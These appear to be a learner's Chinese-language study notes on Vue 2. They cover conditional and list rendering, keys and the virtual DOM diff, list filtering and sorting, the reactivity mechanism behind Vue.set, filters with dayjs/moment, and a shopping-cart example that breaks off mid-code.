- if else if else 中间不要被打断 打断后就失效了 v-if 必须是最先开始使用的
<!-- 
  <div v-if='n==1'>react</div>

  <div>@</div>    打断了

  <div v-else-if='n==2'>vue</div>
  <div v-else='n==3'>angular</div>
 -->


### <template> 和 v-if 的配合使用
- 它不会影响结构 当页面最终渲染的时候 vue会将 template 标签脱掉 
- 优点：不会破坏页面的html结构
- 注意：
- 它只能配合 v-if 的使用
<!-- 
  需求 当 n = 1 的时候展示下面的 h2

  <h2 v-if='n == 1'>你好</h2>
  <h2 v-if='n == 1'>你好</h2>
  <h2 v-if='n == 1'>你好</h2>
  这样n = 1的时候 3个h2都会显示 我们还可以这样


  <div v-if='n == 1'>
    <h2>你好</h2>
    <h2>你好</h2>
    <h2>你好</h2>
  </div>
  但是上面那样破坏了html的结构 还有另外的一种方式


  <template v-if='n == 1'>
    <h2>你好</h2>
    <h2>你好</h2>
    <h2>你好</h2>
  </template>
  template 可以和 v-if 配合使用 不会添加html结构
 -->

--------------------------

### 案例 条件渲染
- 需求:
- 用户在登录的时候, 可以切换使用 用户账号登录 还是 邮箱地址登录

  用户账号: | 用户账号    |  | 切换类型 |

<!-- 
  <div id="app">
    
    // 当满足条件的时候显示if里面的结构, 当不满足条件的时候我们显示else里面的结构
    <span v-if='isUser'>
      <label for="username">
        用户账号:
      </label>
      <input type="text" placeholder='用户账号' id='username' key='username-input'>
    </span>

    <span v-else>
      <label for="email">
        用户邮箱:
      </label>
      <input type="text" placeholder='用户邮箱'  id='email' key='email-input'>
    </span>
    
    <button @click='isUser=!isUser'>切换类型</button>
  </div>

  const app = new Vue({
    el:'#app',
    data: {
      // 我们在这里定义一个状态
      isUser:true
    }
  })
-->

### vue重复利用dom结构的问题
- 在标签中添加自定义属性 key='value', 我们要保证key的值的不同
- key的值如果一样, 那么vue就会认为可以复用 如果不一样就认为不可以不复用 会创建一个新的结构
<!-- 
  <input type="text" placeholder='用户账号' id='username' key='username-input'>
 -->

> 上面的案例存在一些小问题
- 当我们在用户账号上的文本输入框里输入文本后, 点击切换类型后 原来在用户账号的文本框里的文字, 会显示在用户邮箱的文本框里

- 可为什么明明是两个文本框 在第一个文本框里的文本 会出现在第二个文本框中呢

- 按道理来讲, 我们应该切换到另外一个input元素中了, 在另一个input元素中, 我们并没有输入内容, 为什么会出现这个问题呢?

\\ 问题解答:
- 这是因为vue在进行dom渲染时, 出于性能考虑, 会尽可能的复用已经存在的元素, 而不是重新创建新的元素
<!-- 
  假如我们现在有一个div 我们准备把它渲染到浏览器的上面, vue内部并不会把这div直接渲染在浏览器上面, 它会做一层中间环节, 给你搞一个虚拟dom, 把我们要渲染的东西 先放在虚拟内存里面, 然后再把虚拟DOM渲染到浏览器上面

  div   --- >   虚拟DOM   --- >   真实浏览器

  vue在虚拟DOM中vue出于性能的考虑会尽可能的复用已经存在的元素

  虚拟DOM是真实DOM的一种映射
 -->

- 在上面的额案例中, vue内部会发现原来的input元素不再使用, 直接作为else中的input来使用了

\\ 解决方案
- 如果我们不希望vue出现类似重复利用的问题, 可以给对应的input添加key
- 并且我们需要保证key的不同

--------------------------

### 列表渲染 v-for 遍历数组
- 当我们有一组数据需要在页面上进行渲染时, 我们就可以使用v-for来完成
- 我们想生成哪个结构就在哪个结构上 使用 v-for
<!-- 
  根据数据生成多个li
  <ul>
    <li v-for='item in persons'> </li>
  </ul>
 -->


> v-for='(item, index) in 数组对象' :key='item.id'
- 我们使用 v-for in 的句型 来遍历data中的数据 v-for的语法类似js中的for循环
- item 形参 可以在标签体内使用
- 标签属性中还要传入 key值 动态绑定数组对象中的唯一值
<!-- 只要我们通过遍历生成多个结构 必须要在标签属性中添加 key -->

- 语法:
<!-- 
  <ul>
    <li v-for='item in persons' :key='item.id'>
      {{item.name}} -  {{item.age}}
    </li>
  </ul>
-->

- 如果在遍历的过程中, 我们需要拿到元素在数组中的索引值
  v-for='(item, index) in items'
<!-- 其中的index就代表了取出的item在原数组的索引值 -->


> v-for='(value, key, index) in 对象' :key='key'
- 使用v-for遍历对象
- 可以获取 属性值, 属性名, 索引值
<!-- 
  <div id="app">
    <ul>
      <li v-for='(value, key, index) in info'>
        {{key}}:{{value}}:{{index}}
      </li>
    </ul>
  </div>

  const app = new Vue({
    el:'#app',
    data: {
      info: {
        name:'sam',
        age:18,
        height:1.88
      }})
 -->


> v-for='(char, index) in 字符串' :key='index'
- 使用v-for遍历字符串


> v-for='(number, index) in 数字'  :key='index'
- 使用v-for遍历指定次数
<!-- 
  v-for='(number, index) in 5'  :key='index'
  遍历5次
 -->


### 列表过滤(模糊搜索)
- 案例：
- 需求：
- 用户输入文字 我们根据文字来过滤列表中的数据 比如我输入马 页面上展示马冬梅 我输入周 页面上展示周冬雨 和 周杰伦
<!-- 

  <input type="text" v-model='info' placeholder="请输入名字">
  <ul>
    <li v-for='(item, index) in persons' :key='index'>
      {{item.name}} -  {{item.age}}
    </li>
  </ul>

  new Vue({
    el: '#root',
    data() {
      return {
        persons: [
          {id: '001', name: '马冬梅', age: 18},
          {id: '002', name: '周冬雨', age: 17},
          {id: '003', name: '周杰伦', age: 4},
          {id: '004', name: '温兆伦', age: 33},
        ],
        info:''
    } }
  })
 -->

- 1. 收集用户收入数据
- 2. 拿着用户的输入去匹配

- 这个案例最标准的做法是用计算属性去写 我们想用watch来实现

- 思路：
- 用户输入的数据我们可能拿到 接下来我们就要拿着数据去用户信息的数据中去进行过滤
- 我们使用的是v-model来实现的数据获取 假如我们输入了 刘 我们需要过滤一遍用户信息的数据，假如我们输入的是 王 那么我们需要再次的过滤遍数组

- 也就是说当用户输入的关键词发生变化的时候 我们都要进行过滤 那我们怎么知道 用户输入的数据info变了呢 watch 吧

- 也就是说我们拿着用户输入的数据info 去数组persons 中进行过滤 filter
<!-- 
  persons: [
    {id: '001', name: '马冬梅', age: 18},
    {id: '002', name: '周冬雨', age: 17},
    {id: '003', name: '周杰伦', age: 4},
    {id: '004', name: '温兆伦', age: 33},
  ],
  info:'',
  personsArr: []      用于接收过滤出来的新数组


  // 使用watch去监听 info 当info发生改变的时候 会自动调用回调
  watch: {
    info(n) {

      // 我们拿着 info 去监测数组中的每一项里是否包含 info 如果包含 就将其找到 返回出来

      // 注意： 
      filter不会影响原数组它会将找到的值 返回一个新数组 但是 我们不能
      this.persons = this.persons 这样会删除原数组的数据 造成数据越找越少
      所以我们创建一个新的空数组 将过滤出来的数据装到空数组中 dom结果的位置 遍历空数组
      this.personsArr = this.persons.filter( item => {
        return item.name.match(info) != null
      })
    }
  }
 -->

- 上面做完有问题，基本的逻辑可以实现但是 当用户没有在文本框里面输入任何文字的时候我们读取的是‘’ 
- 拿着‘’空串去查找 全都是true 那怎么办？
<!-- 
  我们将watch写成完全形式 并且传入配置项 immediate 为 true 一上来就会先执行一遍回调 这时候我们拿到的就是‘’ 拿着空串去过滤 会全部匹配 页面就会有值了
  watch: {

    使用watch的完整形式
    info: {

      假如这个配置项 让它上来先执行一遍
      immediate:true,

      handler(n) {
        this.personsArr = this.persons.filter(item => {
          return item.name.indexOf(n) !== -1
        })
      }
    }
  }
 -->

<!-- 
  <template>
    <div id="app">
      <ul>
        <li><input type="text" v-model="msg" /></li>

        <li 
          v-for="item of newPersons" 
          :key="item.id"
        >
          {{item.name}} -- {{item.age}}
        </li>
      </ul>
    </div>
  </template>

  <script>

  export default {
    name: 'App',
    data() {
      return {
        persons: [
          {id: '001', name: '马冬梅', age: 18},
          {id: '002', name: '周冬雨', age: 17},
          {id: '003', name: '周杰伦', age: 4},
          {id: '004', name: '温兆伦', age: 33},
        ],
        msg: "",
        newPersons: []
      }
    },
    watch: {
      msg: {
        immediate: true,
        handler(n) {
          this.newPersons = this.persons.filter(item => {
            return item.name.match(n) != null
          })
        }
      }
    }
  }
  </script>
 -->

> 计算属性的写法
- 计算属性中依赖了info 它会在两个时间点触发 一个是一上来 一个是依赖的info发生了变化它会重新计算 也就是说 info 一旦发生改变 整个计算属性都会跟着变

- 我的想法是 计算属性 当有人读取计算属性的时候  它当中的getter方法会从一个地方得到值然后做展示 我们页面上使用 personsArr计算属性进行的遍历 相当于读取了它 它当中的getter就去某个地方拿出来

- 我让它拿用户信息的元数据 persons 当然我们要拿的是 根据用户输入的信息 检索出来的结果

- 因为用户输入信息 info 一旦发生改变 计算属性中依赖了info info变 计算属性就会重新计算 页面就会根据计算属性的结果 重新渲染
<!-- 
  computed: {
    personsArr() {
      return this.persons.filter(item => {
        return item.name.indexOf(this.info) !== -1
      })
    }
  }
 -->


**注意：**
- 1. 我们尽量不要操作元数据 可以创建一个新的空数据盛放搜索的结果

- 2. 
  str.match(val)    找到显示对应的数据 找不到为 null
  str.indexOf(val)  找到显示数据的下标 找不到为 -1
  都可以判断内容是否含有指定值 但是 如果我们val 是 ‘’ str的结果也是能找到 注意注意

--------------------------

### 列表排序
- 我们对上面的例子添加一些功能 添加两个按钮 年龄升序 年龄降序 元顺序
- 点击 年龄升序 之后 页面的列表会按照年龄升序排列
- 点击 年龄降序 之后 同上

- 注意：
- 新功能是上面的过滤是不分家的 比如 用户输入 周 会显示周杰伦 和 周冬雨 这时候我们点击排序就会对 周杰伦 和 周冬雨进行排序


- 思路：
- 我们要知道用户点击按钮是 年龄升序 年龄降序 元顺序 所以我们要设置一个标识

- 元顺序    0
- 年龄降序  1
- 年龄升序  2

- 我们要设计一个变量用来存储用户要操作的类型是什么 sortType
<!-- 
  <button @click='sortType=2'>年龄升序</button>
  <button @click='sortType=1'>年龄降序</button>
  <button @click='sortType=0'>原顺序</button>

  data() {
    return {
      sortType: 0  // 0原顺序 1降序 2升序
    }
  }
 -->

- 因为我们的过滤和排序是不分家 页面渲染也是根据 personsList 这个计算属性来渲染的 所以我们要对 personsList 这个数据 进行排序
<!-- 
  computed: {
    personsList() {

      // 这里我们不能着急的将结果返回 这么返回就是过滤后的结果 我们要再处理好排序的功能后再返回
      return this.persons.filter(item => {
        return item.name.indexOf(this.info) !== -1
      })
    }
  },



  computed: {
    personsList() {
      const  arr = this.persons.filter(item => {
        return item.name.indexOf(this.info) !== -1
      })

      // 判断一下是否需要排序 当sortType为0的时候就是false 不会走里面的逻辑 内部我们可以通过三元表达式来判断看看是不是1

      // 需要注意的是 我们是根据年龄来排序 我们要通过 a.age - b.age 的方式进行排序
      if(this.sortType) {
        arr.sort((a, b) => {
          return this.sortType === 1 ? a.age - b.age : b.age - a.age
        })
      }

      return arr
    }
  },
 -->

- 注意：
- 我们在使用 sort 的时候假如a 和 b是对象的情况下 要通过对象.的方式根据对象内部的属性来进行排序

--------------------------

### 组件的 :key 属性
- key的作用就是给节点进行一个标识 相当于人类社会的身份证号
- 在将结构渲染到列表上的时候 标签属性中不会再出现key 因为这个key是vue在用的

- 官方推荐我们再使用v-for时, 给对应的元素或组件添加一个 :key 属性
- 添加key属性的原因是和vue的虚拟DOM的diff算法有关系

- 当某一层有很多相同的节点时, 也就是列表节点时, 我们希望插入一个新的节点

    A B C D E

- 我们希望可以在B 和 C之间添加一个F, diff算法默认执行起来是这样的
<!-- 
  它会把C更新成F D更新成C E更新成D 最后再插入E, 是不是很没有效率

            虚拟DOM     真实DOM
            li1 > A     li1 > A
            li2 > B     li2 > B

            li6 > F

            li3 > C     li3 > C
            li4 > D     li4 > D
            li5 > E     li5 > E

  它会把3改成f 4改成c 5改成d 6创建e, 这样很笨的, 原来在中间插入就可以了, 但是它却是挨个替换
 -->

- 所以需要使用key来给每一个节点做一个唯一标识
- diff算法就可以正确的识别此节点, 找到正确的位置区插入新的节点, 所以一句话, key的作用主要是为了高效的更新虚拟DOM


> react vue中的key有什么用？
- 虚拟dom中的key的作用
  key是虚拟dom对象的标识 当数据发生变化的时候 vue会根据 新数据 生成 新虚拟dom
  随后vue进行 新虚拟dom 与 旧虚拟dom的差异比较 比较规则如下

  1. 旧虚拟dom中找到了与新虚拟dom相同的key
    若虚拟dom中的内容没变 直接使用之前的真实dom
    若虚拟dom中的内容变了 则生成新的真实dom 随后替换掉页面中之前的真实dom

  2. 旧虚拟dom中未找到与新虚拟dom相同的key
    创建新的真实dom 随后渲染到页面

  3. 用index作为key可能会引发的问题
    若对数据进行 逆序添加 逆序删除等破坏顺序的操作 会产生没有必要的真实dom更新 界面没有问题但是效率低

    若结构中还包含输入类的dom 会产生错误dom更新 界面有问题

--------------------------

### vue 监测对象数据改变的原理
- 我们会在data中配置变量 当我们改变这个变量的时候 页面中应用到这个变量的地方就会发生改变
<!-- 
  data: {
    name: 'sam'   当发生改变的时候 页面用到name的地方也会自动发生变化
  }

  {{name}}

  实现这些的原因就是我们修改了name被vue监测到了 那vue怎么知道name被修改了？
  watch？ 
 -->

- vue里面默认就有一个监视 这个监视的作用就是当数据被改变的时候就自动更新用到这个数据的地方 而watch这个监视就vue交给程序员用的

- 但是无论是vue默认的监视 还是 交给程序员的watch底层原理都是一样的


- 我们要分析一下watch监测数据的原理 阐述之前我们先看看一个小例子
<!-- 
  <button @click='updateMei'> 更新马冬梅信息 </button>
  <ul>
    <li v-for='(item, index) in persons' :key='item.id'>
      {{item.name}} -  {{item.age}}
    </li>
  </ul>

  methods: {
    updateMei() {
      // this.persons[0].name = '马老师'    // 奏效
      // this.persons[0].age = 30          // 奏效

      // 整个 对象 都被 替换掉了
      this.persons[0] = {id: '001', name: '马老师', age: 30}
    }
  }

  马老师的对象被整个替换掉了 但是vue页面没有发生变化
  从代码层面讲 是被修改了
  
  但是 vue 并没有检测到
 -->


- 上面的小例子中我们整体替换掉了数组中的一个对象 导致了页面并没有更新 正常来讲我们修改了data中的数据 那么页面上用的该数据的地方就会自动更新 原因就是我们的修改 vue并没有监测到 那原因是什么呢？


> vue是如何监测对象中的属性的改变的
<!-- 
  data: {
    name: '尚硅谷',
    address: '北京'
  }
  

  <div>
    {{name}} - {{address}}
  </div>

  我们在data中定义的变量name address会在vm的身上也有一份
  vm身上的name address都是来自于 _data中
  _data中的数据 来自于我们传入的data配置项

  data name address

    在这之前还对data中的数据做了一些特殊的处理才放到了_data中

     --- _data name address
        --- vm name address
        (使用defineproperty的getter从_data中获取的)

  但是 vue 在将 data中的数据 复制一份到 _data之前还对数据做了一些的处理
  这个特殊的处理就是我们要了解的部分
 -->

- 我们打印一下 vm._data看看结果 我们只是在data中配置了name 和 address 但是在_data中 我们的数据变成了下面的样子 为什么呢？
<!-- 
  // _data 中的数据
  {__ob__: Observer}
    address: (...)
    name: (...)
    __ob__: Observer {value: {…}, dep: Dep, vmCount: 1}
    get address: ƒ reactiveGetter()
    set address: ƒ reactiveSetter(newVal)
    get name: ƒ reactiveGetter()
    set name: ƒ reactiveSetter(newVal)
    [[Prototype]]: Object

  我们在data中直接配置的是 name address
  但是在._data中 name 和 address的值 给的不是那么直接了 必须要通过 getter 去拿 修改的时候要使用setter
 -->

- 也就是说我们所谓的加工就是将我们传入的每一组kv 都加工成了getter 和 setter的样式

- 正是因为加工这一下子就能做响应式了 比如我们修改了_data.name 那么就会引起setter的调用 vue在setter里面写了一个调用 它会重新的解析模板 生成虚拟dom 进行比较 渲染页面


> 简单的模拟下数据监测
- 我们有一组对象 当该对象的属性被修改的时候 我要输出一句话 该属性被修改了
<!-- 
  let data = {
    name: 'sam',
    address: 'beijing'
  }
 -->

- 先说下自己的思路，我想做一层数据代理 创建了一个空对象，使用Object.defineProperty方法在空对象当中添加name属性 name的属性值通过getter去data.name中获取，在setter中写当修改了name属性的时候我们输出逻辑
<!-- 
  let middle = {}
  Object.defineProperty(middle, 'name', {
    get() {
      console.log('data.name 被读取了')
      return data.name
    },

    set() {
      console.log('data.name 被设置了')
    }
  })
 -->


- 老师带咱写的逻辑
- 首先定义了一个构造函数 在new 实例的时候传入 data对象
- 然后构造函数中接到data对象 开始遍历属性名 使用Object.defineProperty方法将属性名添加到obs实例对象上，然后设置了getter setter

  getter 当读取实例中的属性的时候 将data中的对应属性交出去
  setter 当设置属性的时候 我们去改变data中的对应属性 同时在setter中做更新页面的逻辑
<!-- 
  let data = {
    name: 'sam',
    address: 'beijing'
  }

  // 创建一个监视的实例对象 用于监视data中属性的变化
  const obs = new Observer(data)
  console.log(obs);

  let vm = {}
  vm._data = obs

  // 它的作用是创建一个监视的实例对象 接收一个对象作为参数
  function Observer(obj) {
    // 汇总对象中所有的属性形成一个数组
    let keys = Object.keys(obj)

    // 遍历keys 利用Object.defineProperty方法 往this身上添加属性 this是上面的obs
    keys.forEach(key => {
      Object.defineProperty(this, key, {
        get() {
          return obj[key]
        },

        set(val) {
          obj[key] = val
        }
      })
    })
  }
 -->

- 以上就是就是vue监测对象数据的原理

--------------------------

### Vue.set() API
- 有一种情况 比如我们在页面上展示了data中的一个students对象 我们展示了 姓名 性别
- 当有一天我们还想在页面中展示学生的年龄 怎么办？ 我们可以往data中的学生对象中添加一个年龄的属性么
<!-- 
  {{student.name}}{{student.age}}

  data: {
    student: {
      name: 'sam'
    }
  }

  vm._data.student.age = 18

  {age: 18, __ob__: Observer}

    age: 18        // 它没对应的setter getter

    name: (...)
    __ob__: Observer {value: {…}, dep: Dep, vmCount: 0}
    get name: ƒ reactiveGetter()
    set name: ƒ reactiveSetter(newVal)

 -->

- 我们通过vm._data.student.age = 18 添加了年龄是18 但是我们发现 页面用到年龄的地方并没有更新

- 而且我们发现通过这种方式添加进去的age 并不是 数据监视的状态 它虽然添加在vm身上了 但是因为不是数据监测的状态 就没办法做到响应式

- 因为我们这样添加进去的age 没有对应的getter 和 setter

- 因为我们最开始在data中配置的数据 是在vue new的时候将data中的数据收集到了_data中 然后以_data中的数据做了数据代理放在了vm上 所以才能做到响应式的


- 也就是说我们想用什么 当年一定要先配置好 后期再往里添加的时候 想要做到响应式 就要使用 vue给我们提供的api 


> Vue.set(target, key, value)
- 使用该方法往对象中添加属性 也能做到响应式
- 该方式也可以修改数组身上的数据
<!--  
  Vue.set(this.arr, 1, ”逛街“)
 -->  

- 参数:
- 1. 要往谁的身上追加一个属性
- 2. 属性名
- 3. 属性值
<!--
  methods: {
    handleStudent() {
      Vue.set(this.student, 'age', 18)
    }
  }
-->

> vm.$set(target, key, value)
> this.$set(target, key, value)
- 和上面是一样的作用
- 注意 vm 就是this 也可以是this.$set()


**注意：**
- 该方法只能给data里面的对象里面添加属性 而不是直接在data里面添加属性
<!-- 
  data: {

    // vm.$set(student, age, 18) 这是可以的 因为它在给data里面的student对象里面添加属性
    student:{     
      name
    }

    // vm.$set(data, leader, sam) 这会报错 不能直接给data里添加属性
    leader: 
  }
 -->

- 也就是说这个api的第一个参数不能是vm 和 data


- 有添加那就有删除
> this.$delete(target, key)
> Vue.delete(target, key)
- 移除一个响应式的数据

--------------------------

### vue 监测数组数据改变的原理
- 我们上面知道 当我们在new vue的时候在data中的数据都会被添加数据监测后放到_data里面同时对_data中的数据做数据代理放到vm身上

- 那也就是说 每一个在data中的数据都会有一套为之对应的getter和setter
- 但是我们发现 我们试图找hobby数组的元素的时候 展开这个数组 并没有发现 里面元素的getter和setter

- 也就是说 vue并没有为数组里面的元素匹配一个getter 和 setter
<!-- 
  data() {
    return {
      student: {
        name: 'sam',
        hobby: ['抽烟', '喝酒', '烫头']
      }
    } 
  },


  {__ob__: Observer}
    hobby: Array(3)
    0: "抽烟"
    1: "喝酒"
    2: "烫头"
    length: 3
    __ob__: Observer {value: Array(3), dep: Dep, vmCount: 0}
 -->

- 因为数组里面的你每一个元素并没有对应的getter 和 setter 那也就是说 我们通过数组的索引去改变这个数据的时候 vue是监测不到的 也就是说数组里面的元素不是靠setter 和 getter来监视的
<!-- 
  this.hobby[0] = 'haha'
  这样的方式vue是监测不到的 不会引起页面的更新 
 -->

- 我们可以打开vm看看有没有setter 和 getter就知道了


- 那vue是怎么做的呢？假如我们想修改下下面的数组 我们会用什么方法呢?
<!-- 
  let arr = [1,3,5,7]

  push
  pop
  shift
  unshift
  splice
  sort
  reverse
 -->

- 尤大大说了只有调了数组上的这些方法我才承认你修改了数组 注意只有影响原数组的方式尤大大才会承认
<!-- 
  vm._data.student.hobby.pop()  这样操作的结果才能引起响应式
 -->

- 那vue怎么知道我们使用了push等这些方法的呢
- vue用了 包装技术 将 上述的数组上的方法进行了包装 也就是说我们看到的不再是数组原型上的供给数组使用的方法了 而被vue进行了包装 我们调用的是vue给我们提供的push
<!-- 
  vm.data.student.hobby.push === Array.prototype.push   // false
 -->

- 也就是说我们沿着hobby的原型上找先找到的是vue给我们写的push vue在这个push中做了两件事情
- 1. 它先给你调用了正常数组上的push方法
- 2. 重新解析模板生成虚拟dom。。。

- vue对数组的监测是靠包装数组原型上的方法实现的

- 我们还可以通过这个api来处理操作数组达到响应式的逻辑


> Vue.set() 方法
- Vue.set(arr, index, value)
- 参数:
- 1. 要修改的数组
- 2. 要修改的索引值, 就是修改哪个元素
- 3. 修改后的值
<!-- Vue.set(this.letters, 0, 'bbb') -->

--------------------------

### vue监视数据的原理

- 1. vue会监视data中所有层次的数据
- 2. 如何监测对象中的数据？
  通过setter实现监测 且要在new vue时就传入要监测的数据
  - 1. 对象中后追加的属性 vue默认不做响应式的处理
  - 2. 如需要给后添加的属性做响应式 请使用如下的api
  Vue.set / vm/this.$set

- 3. 如何监测数组总的数据？
  通过包裹数组更新元素的方法实现 本质就是做了两件事情
  - 1. 调用原生对应的方法对数组进行更新
  - 2. 重新解析模板 进而更新页面

- 4. 在vue修改数组中的某个元素一定要用如下的方法
  - 1. push pop shift unshift splice sort reverse
  - 2. Vue.set / vm/this.$set

- 5. 特别注意：
- Vue.set / vm/this.$set 不能给vm或vm的根数据对象 添加属性

--------------------------

### 过滤器 filters
- 过滤器的逻辑我们还可以用methods 和 computed 都能实现
- 过滤器简单的理解为, 将数据 '过滤 / 格式下' 再显示在html结构中
<!-- 比如时间, 数字, 后端传递过来的数据 -->

- 该方法能够接收到模板中 | 管道符号前面的数据 做为过滤器函数中的形参
- 该方法需要返回值

> 语法:
- 过滤器的第一个参数为 管道符号前面的值
- 过滤器还可以传递第二个参数

{{value | 过滤器函数}}

filters: {
  过滤器函数(value, 第二个参数) {
    return 函数内部需要返回值;
  }
}
<!-- 
  当解析的时候 过滤器函数的返回值 会替换掉 {{value | 过滤器函数}} 整个部分
 -->

<!-- 
  // moment 
  比如我们后端传递过来的数据 2019-11-19T04:32:46Z
  filters: {
    format(val) {
      return moment(val).format("YYYY-MM-DD HH:SS");
    }
  }

  <div>{{this.detailList.update_time | format}}</div>


  // day
  <div>{{time | timeFormat}}</div>

  filters: {
    timeFormat(time) {
      return dayjs(time).format('YYYY-MM-DD HH:mm:ss')
    }
  }
 -->

> 过滤器中传递参数
- 参数1： 永远是管道符前面的值
- 参数2： 可以在函数中定义第二个形参来接收

- 应用场景：
- 使用一个过滤器 过滤不同风格的数据
<!-- 
  <div>{{time | timeFormat('YYYY-MM-DD')}}</div>
      //2021-08-27


  <div>{{time | timeFormat}}</div>
      // 2021-08-27 15:51:13


  filters: {

    // 给了形参一个默认值
    timeFormat(time, str='YYYY-MM-DD HH:mm:ss') {
      return dayjs(time).format(str)
    }
  }
 -->


> 多个过滤器之间可以串联
- 上面我们定义了一个格式化时间的 我们再定义一个保留字符串前4位的过滤器
- 我们几个过滤器可以连续使用 第一个过滤器工作后的结果交给下一个过滤器 一层层传递
<!-- 
  <div>{{time | timeFormat('YYYY-MM-DD') | strFormat}}</div>

  filters: {

    // 格式化时间
    timeFormat(time, str='YYYY-MM-DD HH:mm:ss') {
      return dayjs(time).format(str)
    },

    // 字符串截取
    strFormat(val) {
      return val.substr(0,4)
    }
  }
 -->


> 配置全局 过滤器
> Vue.filter('过滤器的名字', fn)
- 参数1：
- 注册过滤器的名字
- 过滤器的处理函数
<!-- 
  Vue.filter('strFormat', function() { })
 -->


> 标签属性中也可以使用过滤器
- 过滤器不仅仅只能用在 插值语法 中 还可以使用在标签属性中
- 我们使用v-bind绑定属性 这样引号里的部分就可以写表达式 就能应用 过滤器
<!-- 
  <h3 :x='msg | strFormat'>测试文本</h3>  
      // <h3 x='你好呀，'>

  data: {
    msg: '你好呀，尚硅谷'
  }
 -->

--------------------------

### moment.js / day.js库
- 上两个时间的格式化库使用方式一样，只是后面的更加的轻量级
- https://cdn.bootcdn.net/ajax/libs/dayjs/1.10.6/dayjs.min.js

> moment基本用法
- 只要我们引入了momentjs的库 全局就多了一个moment()函数

<!--  
  moment(要格式化的时间).format('MMMM Do YYYY, h:mm:ss a')
 -->


> dayjs基本用法
- 只要我们引入了dayjs的库 全局就多了一个dayjs()函数
<!--  
  官网示例
  dayjs(要格式化的时间)
    .startOf('month')
    .add(1, 'day')
    .set('year', 2018)
    .format('YYYY-MM-DD HH:mm:ss')
 -->


- 如果不传入要格式化的时间的话 会以当前时间做格式化

--------------------------

### 数组中哪些方法是响应式的
> 可以做到响应式的方法
- 1. push()
<!-- push('aaa', 'bbb', 'ccc') 这个方法是可以添加多个元素的 -->
- 2. pop()
- 3. unshift()
- 4. shift()
- 5. splice()
<!-- 
  需求 替换 3 4 5 为 6 7 8 
  let arr = [1, 2, 3, 4, 5]

  从索引为2的开始 删除3个 追加3个元素
  app.splice(2, 3, 6, 7, 8)
 -->
- 6. sort()
- 7. reverse()

> 通过索引值修改元素 不是响应式的
  this.letters[0] = 'aaa';
<!-- 结果数组发生了变化 但是页面并没有刷新 -->
- 我们可以这样
<!-- this.letters.splice(0, 1, 'bbb') -->
- 我们还可以这样

> Vue.set() 方法
- Vue.set(arr, index, value)
- 参数:
- 1. 要修改的对象
- 2. 要修改的索引值, 就是修改哪个元素
- 3. 修改后的值
<!-- Vue.set(this.letters, 0, 'bbb') -->

--------------------------

### 案例 图书购物车

> 根据数据 动态生成行
<!-- 
  数据
  data: {
    books: [
      {id:1,name:'算法导论',date:'2006-9',price:85.00,count:1},
      {id:2,name:'UNIX编程艺术',date:'2006-2',price: 59.00,count:1},
      {id:3,name:'编程珠玑',date:'2008-10',price:39.00, count:1},
      {id:4,name:'代码大全',date:'2006-3',price:128.00,count:1}
    ]
  }
 -->
- 一般情况下 我们在制作的表格的时候 里面的内容都不是写死的, 而是从哪获取的数据动态的生成的表格, 这里我们要用v-for来遍历这个数组
- 我们在tr上v-for 因为一本书就是一行, 对于每一行的单元格的遍历 我们有两种方式

- 方式1:
- 我们并不推荐方式1 因为这是整体把数据渲染到DOM结构中, 所以当想对元素做局部的调整的时候 很困难, 比如 我们在count前面添加- + 按钮, 比如给price价格的后面添加小数等等
<!-- 
  <tr v-for='item in books'>
    <td v-for='value in item'>{{value}}</td>
  </tr>
 -->

- 方式2:
- 在对tr使用v-for后 我们是item.属性的方式 手动创建td
<!-- 
  <tr v-for='item in books'>
    <td>{{item.id}}</td>
    <td>{{item.name}}</td>
    <td>{{item.date}}</td>
    <td>{{item.price}}</td>
    <td><button>-</button><span>{{item.count}}</span><button>+</button></td>
    <td><button>移除</button></td>
  </tr>
 -->


> 保留两位小数, price前面添加符号的方法
- 方式1:
- 利用拼接, 缺点不灵活 很繁琐, 尤其是在需要修改的地方比较多的情况下, 另外, html代码的结构阅读起来也不够的清晰
<!-- 
  <td>{{'$' + item.price.toFixed(2)}}</td>
 -->

- 方式2:
- 利用methods 在里面定义函数
- 我们在调用函数的时候, 把item.price作为参数传递了进来
<!-- 
  <td>{{getFinalPrice(item.price)}}</td>

  methods: {
    getFinalPrice(price) {
      return '$' + price.toFixed(2);
    }
  },
 -->

- 方式3:
- 利用filters 在里面定义函数
- 它会把要过滤的东西作为参数传递到函数的里面
<!-- 
  {{item.price | showPrice}}

  filters: {
    showPrice(price) {
      return '$' + price.toFixed(2);
    }
  }
 -->


> 点击按钮 操作count的加减
- 思路:
- 我们再methods中定义两个函数, 来控制按钮的点击
- 我们在点击按钮修改count的时候, 改的是对应书的count, 所以我们面临的第一个问题就是 我们要知道点了哪一本书
<!-- 
  我们就要在v-for遍历books的时候, (item, index) 把这个index 通过 @click='increment(index) 函数调用的方式传递给methods中的函数 
-->

<!-- 
  <button @click='decrement(index)' :disabled='item.count <= 1'>-</button>
  <button @click='increment(index)'>+</button>

  methods: {
    decrement(index) {
      // 然后我们根据index就能取到点击的那本的count
      this.books[index].count--;
    },

    increment(index) {
      this.books[index].count++;
    }
  },
 -->

- 还有 我们在修改count的时候 不能为负数, 或者说不能小于1, 当<=1的时候 我们禁用按钮的点击功能, 当为true的时候 禁用按钮 既然后面是一个布尔值 我们可以通过
  v-bind:disabled
的方式, 动态的修改是否禁用按钮
<!-- 
  <button disabled = true / false>

  <button @click='decrement(index)' :disabled='item.count <= 1'>-</button>
-->


> 移除按钮 和 删除所有数据后 页面显示 购物车为空
- 购物车为空:
- 如果页面有数据(表内没删完)就显示表格内的数据, 当删完了就显示购物车为空
- 使用v-if v-else
- 我们再v-if中添加 books.length 因为表是通过data中的数组创建的, 所以清空数组后books.length的值为0 0转换为布尔值为false
<!-- 
  那么就说明 本身就有两个结构, 我们通过v-if v-else还决定显示哪个部分

  <div v-if='books.length'>
    <table></table>
  </div>

  <h3 v-else>购物车为空</h3>
 -->

- 移除按钮:
- 在这里我们也要传递进来一个index 我们要知道我们移除的是哪个
<!-- 
  removeHandle(index) {
    this.books.splice(index, 1);
  }
 -->

> 总价格的部分
- 我们使用计算属性来做
<!-- 
  <h3>总价格: {{totalPrice | showPrice}}</h3>

  computed: {
    totalPrice() {
      let totalPrice = 0;
      for(let i=0; i<this.books.length; i++) {
        totalPrice += this.books[i].price * this.books[i].count;
      }
      return totalPrice;
    }
  }
 -->
>>> 这里有个问题 我的疑惑是 在计算属性里 for循环遍历 遍历的不是data中的books数据么? 按我的理解应该是计算出了data中的price的总价格, 但实际上确实跟页面上的数据挂钩了 我点加 减都会改变总价格 为什么???

> 完整的代码部分:
<!-- 
  const app = new Vue({
    el:'#app',
    data: {
      books: [
